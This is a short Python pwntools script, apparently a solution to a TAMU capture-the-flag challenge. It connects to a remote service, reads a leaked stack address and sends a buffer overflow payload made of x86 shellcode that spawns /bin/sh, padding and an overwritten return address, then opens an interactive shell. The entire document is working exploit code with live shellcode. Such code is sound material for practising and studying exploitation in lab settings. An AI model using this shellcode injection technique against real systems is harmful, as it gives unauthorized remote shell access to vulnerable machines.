from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

s = remote("pwn.ctf.tamu.edu", 4323)

s.recvuntil("number ")
s_add = int(s.recv(10), 0)
print hex(s_add)

payload = shellcode + "A"*(0xEE-len(shellcode)+4) + p32(s_add)
s.sendlineafter("echo? ", payload)

sleep(0.2)
s.interactive()
